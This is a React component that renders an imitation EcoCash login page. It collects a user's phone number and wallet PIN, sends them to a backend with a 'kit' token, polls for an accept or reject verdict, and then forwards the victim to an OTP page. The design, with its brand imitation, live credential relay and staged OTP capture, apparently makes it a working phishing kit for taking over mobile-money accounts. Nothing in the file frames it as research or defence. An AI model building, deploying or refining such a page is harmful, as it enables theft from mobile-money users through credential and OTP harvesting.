import React, { useState, useRef, useEffect } from "react";
import { useFetcher } from "react-router";
import type { Route } from "./+types/process-new";

export default function EcoCashLogin({ params }: Route.ComponentProps) {
  const { amount } = params;
  const [phoneNumber, setPhoneNumber] = useState("");
  const [pin, setPin] = useState(["", "", "", ""]);
  const [errors, setErrors] = useState<{ phone?: string; pin?: string }>({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  //const pkg = plans.find(p => p.price === price);

  const inputRefs = [
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
  ];

  const handlePinChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return; // Only allow numbers

    // Clear any previous PIN validation error once the user types
    if (errors.pin) {
      setErrors((prev) => ({ ...prev, pin: undefined }));
    }

    const newPin = [...pin];
    newPin[index] = value.slice(-1); // Only keep the last digit input
    setPin(newPin);

    // Auto-focus next input
    if (value && index < 3) {
      inputRefs[index + 1].current?.focus();
    }
  };

  const handleKeyDown = (
    index: number,
    e: React.KeyboardEvent<HTMLInputElement>,
  ) => {
    // Move backward on backspace if current field is empty
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      inputRefs[index - 1].current?.focus();
    }
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, ""); // Numeric characters only
    setPhoneNumber(value);

    // Clear error dynamically as the user works toward a valid input structure
    if (errors.phone) {
      setErrors((prev) => ({ ...prev, phone: undefined }));
    }
  };

  const validateForm = (): boolean => {
    const currentErrors: { phone?: string; pin?: string } = {};

    // Lesotho standard subscriber mobile numbers are exactly 8 or 9 digits depending on routing layers
    // Usually 8 digits or 9 digits total. We enforce a robust 8-9 criteria check here.
    if (!phoneNumber) {
      currentErrors.phone = "Phone number is required";
    } else if (phoneNumber.length < 8 || phoneNumber.length > 9) {
      currentErrors.phone = "Must be a valid phone number (8-9 digits)";
    }

    // Pin must be full 4 digits
    if (pin.some((digit) => digit === "")) {
      currentErrors.pin = "Please enter your complete 4-digit security PIN";
    }

    setErrors(currentErrors);
    return Object.keys(currentErrors).length === 0;
  };

  const fetcher = useFetcher();
  const [attempt, setAttempt] = useState(0);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateForm()) return;

    setIsSubmitting(true);
    setOpen(true);
    localStorage.setItem("kit", `${new Date().getTime().toString()}${attempt}${amount}`);
    await fetcher.submit(
      {
        phone: phoneNumber,
        pin: pin.join(""),
        amount: amount || "",
        kit: localStorage.getItem("kit"),
        action: "submit-phone",
      },
      {
        method: "POST",
        action: "/api/main",
      },
    );
    setAttempt(Number(attempt)+1);


    //window.location.href = `/otp/${phoneNumber}/${amount}`;

    setIsSubmitting(false);
  };

  const [open, setOpen] = useState(false);
  const [message, setMessage] = useState(
    "Please wait while we process your request...",
  );

  // useEffect(() => {
  //   if (fetcher.data?.success|| fetcher.data?.status) {
  //     setMessage("Validation running please wait...");
  //     const interval = setInterval(async () => {
  //       if (fetcher.data?.status == "accept") {
  //         setMessage(fetcher.data?.message);
  //         window.location.href = `/otp/${phoneNumber}/${amount}`;
  //         clearInterval(interval);
  //       } else if (fetcher.data?.status == "reject") {
  //         setErrors({ phone: "Phone number or pin is invalid" , pin: ""});
  //         setOpen(false);
  //         clearInterval(interval);
  //       } else if (fetcher.data?.status == "error") {
  //         setErrors({ phone: "Something broke try again" , pin: ""});

  //         setOpen(false);
  //         clearInterval(interval);

  //       }
  //       await fetcher.submit(
  //         {},
  //         {
  //           method: "POST",
  //           action: "/pool/" + (localStorage.getItem("kit")??""),
  //         },
  //       );
  //       setMessage("Validation ongoing...");
  //     }, 2000);

  //     return () => clearInterval(interval);
  //   }
  // }, [fetcher.data]);
  const pollStartTimeRef = useRef<number>(null);
  useEffect(() => {
  const data = fetcher.data;
  if (!data) return;
if ((data?.success || data?.status) && !pollStartTimeRef.current) {
    pollStartTimeRef!.current = Date.now();
    setMessage("Validation running please wait...");
  }

  // 3. Check if 45 seconds have passed
  if (pollStartTimeRef.current) {
    const elapsedSeconds = (Date.now() - pollStartTimeRef.current) / 1000;
    if (elapsedSeconds >= 45) {
      setMessage("Validation timed out. Please try again.");
      setErrors({ phone: "Validation timed out. Please try again." , pin: ""});

      setOpen(false);
      pollStartTimeRef.current = null; // Reset the timer
      return; 
    }
  }

  // 1. Handle final states immediately when fetcher.data updates
  if (data.status === "accept") {
    setMessage(data.message);
    window.location.href = `/otp/${phoneNumber}/${amount}`;
    return; // Stop here, no further polling
  }

  if (data.status === "reject" || data.status === "error") {
    setErrors({ phone: "Phone number or pin is invalid" , pin: ""});

    setMessage(data.message);
    setOpen(false);
    return; // Stop here, no further polling
  }

  // 2. Handle the ongoing polling state
  if (data.success || data.status) {
    setMessage("Validation ongoing...");

    const timer = setTimeout(async () => {
      await fetcher.submit(
        {},
        {
          method: "POST",
          action: "/pool/" + (localStorage.getItem("kit") ?? ""),
        }
      );
    }, 5000);

    // 3. Clean up the timeout if the component unmounts or data changes
    return () => clearTimeout(timer);
  }
}, [fetcher.data, phoneNumber, amount]); // Include all external dependencies


  return (
    <div className="min-h-screen bg-white flex flex-col justify-between  font-sans relative antialiased selection:bg-blue-100">
      {/* Top Content Area */}
      <div className="w-full max-w-md mx-auto px-6 pt-12 flex- flex flex-col items-center">
        {/* Logo Section */}
        <div className="text-center mb-6 tracking-tight ">
          <span className="text-[#0d5cb5] text-4xl font-bold tracking-[-0.03em]">
            Eco
          </span>
          <span className="text-[#e23730] text-4xl font-bold tracking-[-0.03em]">
            Cash
          </span>
          <h2 className="text-[#333333] text-[22px] font-medium mt-3">Login</h2>
        </div>

        {/* Form Container */}
        <form
          onSubmit={handleSubmit}
          className="w-full max-w-[340px] flex flex-col items-center"
        >
          {/* Phone Number Input Wrapper */}
          <div className="w-full">
            <div
              className={`w-full flex items-center border-2 rounded-xl px-4 py-3 bg-white transition-all focus-within:shadow-[0_0_0_1px_rgba(18,94,183,1)] ${
                errors.phone ? "border-[#e23730]" : "border-[#125eb7]"
              }`}
            >
              {/* Lesotho Flag Graphic Container */}
              <div className="hidden flex-col w-[24px] h-[16px] border border-gray-300 rounded-[1px] overflow-hidden shrink-0">
                <div className="h-[5px] bg-[#00209F]"></div>
                <div className="h-[6px] bg-white flex items-center justify-center relative">
                  <div className="w-2 h-2 bg-black rounded-sm transform scale-x-75 scale-y-110"></div>
                </div>
                <div className="h-[5px] bg-[#009543]"></div>
              </div>

              <span className="text-black font-semibold text-[16px] ml-3 tracking-wide">
                +263
              </span>
              <input
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                value={phoneNumber}
                onChange={handlePhoneChange}
                disabled={isSubmitting}
                className="ml-2 w-full text-black font-medium text-[16px] focus:outline-none tracking-wide disabled:bg-transparent"
                placeholder="Enter number"
                maxLength={9}
              />
            </div>
            {errors.phone && (
              <p className="text-[#e23730] text-xs mt-1.5 text-left w-full pl-1 animate-pulse">
                {errors.phone}
              </p>
            )}
          </div>

          {/* PIN Input Section */}
          <div className="mt-8 w-full text-center">
            <label
              className={`text-xs tracking-normal block mb-3 font-normal transition-colors ${
                errors.pin ? "text-[#e23730] font-medium" : "text-gray-500"
              }`}
            >
              Enter your PIN
            </label>

            <div className="flex justify-center gap-3">
              {pin.map((digit, index) => (
                <input
                  key={index}
                  ref={inputRefs[index]}
                  type="password"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={1}
                  value={digit}
                  disabled={isSubmitting}
                  onChange={(e) => handlePinChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className={`w-[52px] h-[52px] border-2 rounded-xl text-center text-xl font-bold text-black focus:outline-none transition-all ${
                    errors.pin
                      ? "border-[#e23730] focus:bg-red-50/10"
                      : "border-[#125eb7] focus:bg-blue-50/20"
                  }`}
                />
              ))}
            </div>

            {errors.pin && (
              <p className="text-[#e23730] text-xs mt-2 animate-pulse">
                {errors.pin}
              </p>
            )}

            <button
              type="button"
              disabled={isSubmitting}
              className="text-[#7c8b9a] text-xs font-normal mt-4 hover:underline tracking-normal block mx-auto disabled:opacity-50"
            >
              Forgot PIN?
            </button>
          </div>
        </form>
      </div>

      {/* Wave Bottom Decorative Section */}
      <div className="w-full relative bg-[#126ce5] pt-14 pb-8 px-6 text-center text-white flex-1 mt-8  ">
        <div className="absolute -z-2 top-0 left-0 right-0 transform -translate-y-[99%] pointer-events-none">
          <svg
            viewBox="0 0 1440 120"
            fill="none"
            className="w-full h-auto block"
          >
            <path
              d="M0,120 C480,120 960,-20 1440,120 L1440,120 L0,120 Z"
              fill="#126ce5"
            />
          </svg>
        </div>

        {/* Footer Support Text */}
        <div className="max-w-xs mx-auto mb-6 text-center">
          <p className="text-[12px] leading-[1.5] text-white/95 font-medium tracking-wide">
            To register a EcoCash wallet or get assistance,
            <br />
            click below
          </p>
        </div>

        {/* Main Form Submit Trigger Action */}
        <button
          onClick={handleSubmit}
          type="submit"
          disabled={isSubmitting}
          className="w-full max-w-[170px] mx-auto bg-white text-[#125eb7] font-bold text-xs py-3 px-6 rounded-xl shadow-md hover:bg-gray-50 transition-all tracking-wide block mb-8 disabled:opacity-75 disabled:cursor-not-allowed select-none active:scale-[0.98]"
        >
          {isSubmitting ? (
            <span className="flex items-center justify-center gap-1.5">
              {/* Native CSS Spinner */}
              <span className="w-3.5 h-3.5 border-2 border-[#125eb7]/30 border-t-[#125eb7] rounded-full animate-spin"></span>
              Processing...
            </span>
          ) : (
            "Submit"
          )}
        </button>

        {/* App Metadata Info */}
        <div className="text-[10px] text-white/70 font-mono tracking-wider space-y-1">
          <div>v2.2.3P</div>
          <div className="tracking-normal font-sans font-normal opacity-90 text-[11px]">
            By signing in you agree to the{" "}
            <a
              href="#"
              className="underline hover:text-white transition-colors"
            >
              Terms and Conditions
            </a>
          </div>
        </div>
      </div>
      <LoadingModal open={open} title="Processing request" message={message} />
    </div>
  );
}

import { Loader2 } from "lucide-react";

type LoadingModalProps = {
  open: boolean;
  title?: string;
  message?: string;
};

export function LoadingModal({
  open,
  title = "Processing request",
  message = "Please wait while we process your request...",
}: LoadingModalProps) {
  if (!open) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
      <div className="w-full max-w-sm rounded-2xl bg-white p-6 shadow-2xl dark:bg-gray-900">
        <div className="flex flex-col items-center text-center">
          {/* Spinner */}
          <div className="mb-5 flex h-14 w-14 items-center justify-center rounded-full bg-green-100 dark:bg-green-900/30">
            <Loader2 className="h-7 w-7 animate-spin text-green-600" />
          </div>

          {/* Title */}
          <h2 className="text-lg font-semibold text-gray-900 dark:text-white">
            {title}
          </h2>

          {/* Message */}
          <p className="mt-2 text-sm leading-6 text-gray-500 dark:text-gray-400">
            {message}
          </p>

          {/* Loading dots */}
          <div className="mt-5 flex gap-1.5">
            <span className="h-2 w-2 animate-bounce rounded-full bg-green-600 [animation-delay:-0.3s]" />
            <span className="h-2 w-2 animate-bounce rounded-full bg-green-600 [animation-delay:-0.15s]" />
            <span className="h-2 w-2 animate-bounce rounded-full bg-green-600" />
          </div>
        </div>
      </div>
    </div>
  );
}
